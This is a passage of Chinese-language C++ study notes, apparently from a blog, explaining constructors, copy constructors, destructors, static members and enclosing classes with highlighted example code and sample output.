class="keyword">class</span> <span class="title">Location</span>&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x = <span class="number">0</span>, <span class="keyword">int</span> y = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">valueX</span><span class="params">( <span class="keyword">int</span> val)</span> </span>&#123; x = val;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">valueX</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> x;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> Location::init( <span class="keyword">int</span> X, <span class="keyword">int</span> Y)&#123;</span><br><span class="line">    x = X;</span><br><span class="line">    y = Y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Location A;</span><br><span class="line">    A.init(<span class="number">5</span>);</span><br><span class="line">    A.valueX(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;A.valueX();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用缺省参数要注意避免有函数重载时的二义性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Location</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">( <span class="keyword">int</span> x = <span class="number">0</span>, <span class="keyword">int</span> y = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">valueX</span><span class="params">( <span class="keyword">int</span> val = <span class="number">0</span>)</span></span>&#123; x = val;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> x;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Location A;</span><br><span class="line">A.valueX();<span class="comment">// error</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="复制构造函数-copy-constructor"><a href="#复制构造函数-copy-constructor" class="headerlink" title="复制构造函数(copy constructor)"></a>复制构造函数(copy constructor)</h2><ul><li>只有一个参数，即对同类对象的引用</li><li>形如 X::X(X&amp;) 或 X::X(const X &amp;),二者选一后者能以常亮对象作为参数</li><li><p>如果没有定义复制构造函数，那么编译器生成默认复制构造函数。默认的复制构造函数完成复制功能。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> real,imag;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Complex c1; <span class="comment">//调用缺省无参构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="function">Complex <span class="title">c2</span><span class="params">(c1)</span></span>;<span class="comment">//调用缺省的复制构造函数,将 c2 初始化成和c1一样</span></span><br></pre></td></tr></table></figure></li><li><p>如果定义自己的复制构造函数，则默认的复制构造函数不存在。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line"><span class="keyword">double</span> real,imag;</span><br><span class="line">Complex()&#123; &#125;</span><br><span class="line">Complex( <span class="keyword">const</span> Complex &amp; c ) &#123;</span><br><span class="line">real = c.real;</span><br><span class="line">imag = c.imag;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; “Copy Constructor called”;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Complex c1;</span><br><span class="line"><span class="function">Complex <span class="title">c2</span><span class="params">(c1)</span></span>;<span class="comment">//调用自己定义的复制构造函数，输出 Copy Constructor called</span></span><br></pre></td></tr></table></figure></li><li><p>不允许有形如 X::X(X)的构造函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class CSample&#123;</span><br><span class="line">CSample(CSample c)&#123;</span><br><span class="line">&#125;//不允许这样的构造函数</span><br><span class="line">&#125;;</span><br><span class="line">### 复制构造函数起作用的三种情况</span><br><span class="line">* 当用一个对象去初始化同类的另一个对象时</span><br><span class="line">```cpp</span><br><span class="line">complex c2(c1);</span><br><span class="line">complex c2 = c1;//初始化语句，非赋值语句</span><br></pre></td></tr></table></figure></li><li><p>如果某个函数有一个参数是类A的对象，那么该函数被调用时，类A的复制构造函数将被调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">A()&#123;&#125;;</span><br><span class="line">A(A &amp; a)&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Copy constructor called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Func</span><span class="params">(A a1)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">A a2;</span><br><span class="line">Func(a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果函数的返回值是类A的对象时，则函数返回时，A的复制构造函数被调用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line">A(<span class="keyword">int</span> n)&#123; v = n;&#125;;</span><br><span class="line">A(<span class="keyword">const</span> A &amp; a)&#123;</span><br><span class="line">v = a.v;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Copy constructor called"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">A <span class="title">Func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">A <span class="title">b</span><span class="params">(<span class="number">4</span>)</span></span>;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;Func().v&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="类型转换构造函数"><a href="#类型转换构造函数" class="headerlink" title="类型转换构造函数"></a>类型转换构造函数</h2><ul><li>目的：实现类型的自动转换</li><li>特点：只有一个参数，不是复制构造函数</li><li>编译系统会自动调用-转换构造函数<br>建立一个 临时对象/临时变量<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">double</span> real, imag;</span><br><span class="line">Complex( <span class="keyword">int</span> i )&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"IntConstructor called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">real = i;</span><br><span class="line">imag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Complex( <span class="keyword">double</span> r, <span class="keyword">double</span> i)</span><br><span class="line">&#123;</span><br><span class="line">real = r;</span><br><span class="line">imag = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">Complex <span class="title">c1</span><span class="params">(<span class="number">7</span>,<span class="number">8</span>)</span></span>;</span><br><span class="line">Complex c2 = <span class="number">12</span>;</span><br><span class="line">c1 = <span class="number">9</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c1.real &lt;&lt; <span class="string">","</span> &lt;&lt; c1.imag &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="析构函数-Destructor"><a href="#析构函数-Destructor" class="headerlink" title="析构函数(Destructor)"></a>析构函数(Destructor)</h2><ul><li>成员函数的一种<ul><li>名字与类名相同</li><li>在前面加<code>~</code></li><li>没有参数和返回值</li><li>一个类最多只有一个析构函数</li></ul></li><li>对象消亡时，自动被调用<ul><li>在对象消亡前做善后工作<ul><li>释放分配的空间等</li></ul></li></ul></li><li>定义类时没写析构函数，则编译器生成缺省析构函数<ul><li>不涉及释放用户申请的内存释放等清理工作</li></ul></li><li>定义了析构函数,则编译器不生成缺省析构函数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">String()&#123;</span><br><span class="line">p = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>];</span><br><span class="line">&#125;</span><br><span class="line">~String();</span><br><span class="line">&#125;;</span><br><span class="line">String::~String()&#123;</span><br><span class="line"><span class="keyword">delete</span> []p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="析构函数和数组"><a href="#析构函数和数组" class="headerlink" title="析构函数和数组"></a>析构函数和数组</h3><ul><li>对象数组生命期结束时<br>对象数组的每个元素的析构函数都会被调用<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctest</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">~Ctest()&#123; <span class="built_in">cout</span> &lt;&lt;<span class="string">"destructor called"</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Ctest <span class="built_in">array</span>[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"End Main"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="析构函数和运算符delete"><a href="#析构函数和运算符delete" class="headerlink" title="析构函数和运算符delete"></a>析构函数和运算符delete</h3><ul><li>delete运算导致析构函数调用<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ctest *pTest;</span><br><span class="line">pTest = <span class="keyword">new</span> Ctest;<span class="comment">//构造函数调用</span></span><br><span class="line"><span class="keyword">delete</span> pTest; <span class="comment">//析构函数调用</span></span><br><span class="line">pTest = <span class="keyword">new</span> Ctest[<span class="number">3</span>]; <span class="comment">//构造函数调用3次</span></span><br><span class="line"><span class="keyword">delete</span>[] pTest; <span class="comment">//析构函数调用3次</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="构造函数和析构函数调用时机"><a href="#构造函数和析构函数调用时机" class="headerlink" title="构造函数和析构函数调用时机"></a>构造函数和析构函数调用时机</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Demo( <span class="keyword">int</span> i )</span><br><span class="line">&#123;</span><br><span class="line">id = i;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"id="</span>&lt;&lt;id&lt;&lt;<span class="string">"Constructed"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Demo()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"id="</span>&lt;&lt;id&lt;&lt;<span class="string">"Destructed"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Demo <span class="title">d1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">static</span> Demo <span class="title">d2</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line"><span class="function">Demo <span class="title">d3</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Func"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">Demo <span class="title">d4</span><span class="params">(<span class="number">4</span>)</span></span>;</span><br><span class="line">d4 = <span class="number">6</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"main"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#123;<span class="function">Demo <span class="title">d5</span><span class="params">(<span class="number">5</span>)</span></span>;&#125;</span><br><span class="line">Func();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"main ends"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">输出:</span><br><span class="line">id=1 Constructed</span><br><span class="line">id=4 Constructed</span><br><span class="line">id=6 Constructed</span><br><span class="line">id=6 Destructed</span><br><span class="line">main</span><br><span class="line">id=5 Constructed</span><br><span class="line">id=5 Destructed</span><br><span class="line">id=2 Constructed</span><br><span class="line">id=3 Constructed</span><br><span class="line">Func</span><br><span class="line">id=3 Destructed</span><br><span class="line">main ends</span><br><span class="line">id=6 Destructed</span><br><span class="line">id=2 Destructed</span><br><span class="line">id=1 Destructed</span><br></pre></td></tr></table></figure><h2 id="静态成员变量和静态成员函数"><a href="#静态成员变量和静态成员函数" class="headerlink" title="静态成员变量和静态成员函数"></a>静态成员变量和静态成员函数</h2><ul><li>静态成员:在说明前加了static关键字的成员<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRectangle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> w,h;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nTotalArea; <span class="comment">//静态成员变量</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nTotalNumber;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CRectangle(<span class="keyword">int</span> w_,<span class="keyword">int</span> h_);</span><br><span class="line">~CRectangle();</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintTotal</span><span class="params">()</span></span>;<span class="comment">//静态成员函数</span></span><br><span class="line">&#125;;</span><br><span class="line">普通成员变量每个对象有各自的一份,而静态成员变量一共就一份,为所有对象共享.</span><br><span class="line"><span class="keyword">sizeof</span>运算符不会计算静态成员变量</span><br><span class="line">```cpp</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMyclass</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> s;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">sizeof</span>(CMyclass)等于<span class="number">4</span></span><br><span class="line">普通成员变量每个对象有各自的一份,而静态成员变量一共就一份,为所有对象共享.</span><br><span class="line">普通成员函数必须具体作用于某个对象,而静态成员函数并不具体作用与某个对象.</span><br><span class="line">因此静态成员不需要通过对象就能访问.</span><br><span class="line">### 如何访问静态成员</span><br><span class="line"><span class="number">1.</span> 类名::成员名</span><br><span class="line">CRectangle::PrintTotal();</span><br><span class="line"><span class="number">2.</span> 对象名.成员名</span><br><span class="line">CRectangle r;r.PrintTotal();</span><br><span class="line"><span class="number">3.</span> 指针-&gt;成员名</span><br><span class="line">CRectangle *p = &amp;r; p-&gt;PrintTotal();</span><br><span class="line"><span class="number">4.</span> 引用.成员名</span><br><span class="line">CRectangle &amp; ref = r; <span class="keyword">int</span> n = ref.nTotalNumber;</span><br><span class="line">* 静态成员变量本质上是全局变量,哪怕一个对象都不存在,类的静态成员变量也存在.</span><br><span class="line">* 静态成员函数本质上是全局函数.</span><br><span class="line">* 设置静态成员这种脊椎的目的时将和某些类紧密相关的全局变量和函数写到类里面,看上去像一个整体,易于维护和理解.</span><br><span class="line"></span><br><span class="line">考虑一个需要随时知道矩形总数和总面积的图形处理程序,可以用全局变量来记录总数和总面积,用静态成员将这两个变量封装进类中.</span><br><span class="line">```cpp</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRectangle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> w,h;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nTotalArea;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nTotalNumber;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CRectangle(<span class="keyword">int</span> w_,<span class="keyword">int</span> h_);</span><br><span class="line">~CRectangle();</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintTotal</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">CRectangle::CRectangle(<span class="keyword">int</span> w_,<span class="keyword">int</span> h_)</span><br><span class="line">&#123;</span><br><span class="line">w = w_;</span><br><span class="line">h = h_;</span><br><span class="line">nTotalNumber++;</span><br><span class="line">nTotalArea += w * h;</span><br><span class="line">&#125;</span><br><span class="line">CRectangle::~CRectangle()</span><br><span class="line">&#123;</span><br><span class="line">nTotalNumber--;</span><br><span class="line">nTotalArea -= w * h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> CRectangle::PrintTotal()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;nTotalNumber&lt;&lt;<span class="string">","</span>&lt;&lt;nTotalArea&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> CRectangle::nTotalNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> CRectangle::nTotalArea = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//必须在定义类的文件中对静态成员变量进行一次说明</span></span><br><span class="line"><span class="comment">//或初始化,否则编译能通过,链接不能通过.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CRectangle r1(3,3),r2(2,2);</span><br><span class="line"><span class="comment">//cout&lt;&lt;CRectangle::nTotalNumber; wrong private</span></span><br><span class="line">CRectangle::PrintTotal();</span><br><span class="line">r1.PrintTotal();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">* 在静态成员函数中,不能访问非静态成员变量,也不能调用非静态成员函数.</span><br><span class="line">在使用CRectangle类时，有时会调用复制构造函数</span><br><span class="line">生成临时的隐藏的CRectangle对象</span><br><span class="line">调用一个以CRectangle类对象作为参数的函数时，</span><br><span class="line">调用一个以CRectangle类对象作为返回值的函数时</span><br><span class="line">临时对象在消亡时会调用析构函数，减少nTotalNumber 和</span><br><span class="line">nTotalArea的值，可是这些临时对象在生成时却没有增加</span><br><span class="line">nTotalNumber 和 nTotalArea的值。</span><br><span class="line">解决方法:写一个复制构造函数</span><br><span class="line">```cpp</span><br><span class="line">CRectangle::CRectangel(CRectangle &amp; r)</span><br><span class="line">&#123;</span><br><span class="line">w=r.w;</span><br><span class="line">h=r.h;</span><br><span class="line">nTotalNumber++;</span><br><span class="line">nTotalArea+=w*h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="成员对象和封闭类"><a href="#成员对象和封闭类" class="headerlink" title="成员对象和封闭类"></a>成员对象和封闭类</h2><ul><li>成员对象:一个类的成员变量时另一个类的对象</li><li>包含成员对象的类叫封闭类(Enclosing)<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTyre</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> radius;</span><br><span class="line"><span class="keyword">int</span> width;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CTyre(<span class="keyword">int</span> r,<span class="keyword">int</span> w):radius(r),width(w)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CEngine</span>&#123;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> price;</span><br><span class="line">CTyre tyre;</span><br><span class="line">CEngine engine;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CCar(<span class="keyword">int</span> p, <span class="keyword">int</span> tr, <span class="keyword">int</span> tw);</span><br><span class="line">&#125;;</span><br><span class="line">CCar::CCar(<span class="keyword">int</span> p, <span class="keyword">int</span> tr, <span class="keyword">int</span> w):price(p), tyre(tr, w)&#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">CCar <span class="title">car</span><span class="params">(<span class="number">20000</span>,<span class="number">17</span>,<span class="number">225</span>)</span></span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>如果CCar类不定义构造函数,则 CCar car;//编译出错<br>编译器不知道 car.tyre 该如何初始化<br>car.engine 的初始化没有问题:用默认构造函数<br>生成封闭类对象的语句 